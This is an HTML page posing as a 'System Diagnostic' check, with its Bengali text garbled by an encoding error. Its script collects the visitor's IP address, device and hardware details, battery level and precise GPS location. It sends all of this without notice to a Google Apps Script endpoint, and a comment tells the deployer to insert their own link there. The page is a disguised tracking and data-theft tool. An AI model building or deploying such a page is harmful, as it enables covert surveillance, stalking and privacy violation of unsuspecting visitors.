<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #eef2f3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
        button { background: #007bff; color: white; border: none; padding: 15px 25px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
        #msg { margin-top: 15px; color: #555; font-size: 14px; }
    </style>
</head>
<body>

    <div class="card">
        <h3>‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶ö‡ßá‡¶ï üõ°Ô∏è</h3>
        <p>‡¶è‡¶ó‡¶ø‡ßü‡ßá ‡¶Ø‡ßá‡¶§‡ßá ‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶¨‡¶æ‡¶ü‡¶®‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßá ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶¶‡¶ø‡¶®‡•§</p>
        <button id="startBtn">‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        <p id="msg"></p>
    </div>

    <script>
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyyNubGbWtoNhKMfzFiEmTjhd-KyzbC58N-1x7iVg1xKhlqBcOHrGRZpKlbx7NEa-5d/exec"; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ó‡ßÅ‡¶ó‡¶≤ ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¶‡¶ø‡¶®

        // GPU ‡¶®‡¶æ‡¶Æ ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        function getGPU() {
            let canvas = document.createElement('canvas');
            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "Not Supported";
            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
        }

        document.getElementById('startBtn').addEventListener('click', async function() {
            let msg = document.getElementById('msg');
            msg.innerText = "‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá... üîÑ";
            this.disabled = true;

            let info = {
                ip_address: "Searching...",
                device_info: navigator.userAgent,
                battery: "Unknown",
                cpu: navigator.hardwareConcurrency || "Unknown",
                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
                gpu: getGPU(),
                location: "Not Provided"
            };

            try {
                // ‡ßß. ‡¶Ü‡¶á‡¶™‡¶ø ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                info.ip_address = ipData.ip;

                // ‡ß®. ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡¶ø ‡¶§‡¶•‡ßç‡¶Ø
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    info.battery = (bat.level * 100) + "%";
                }

                // ‡ß©. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ü‡ßç‡¶∞‡¶æ‡¶á ‡¶ï‡¶∞‡¶æ
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        info.location = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        sendData(info);
                    },
                    (err) => {
                        info.location = "Denied";
                        sendData(info);
                    },
                    { timeout: 5000 }
                );

            } catch (e) {
                sendData(info);
            }
        });

        function sendData(data) {
            fetch(SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                cache: 'no-cache',
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById('msg').innerText = "‡¶ö‡ßá‡¶ï ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶® ‡¶π‡ßü‡ßá‡¶õ‡ßá! ‚úÖ";
                alert("‡¶∏‡¶¨ ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶ó‡ßá‡¶õ‡ßá‡•§ ‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶! üòä");
            }).catch(e => {
                document.getElementById('msg').innerText = "‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø ‡¶ò‡¶ü‡ßá‡¶õ‡ßá!";
            });
        }
    </script>
</body>
</html>
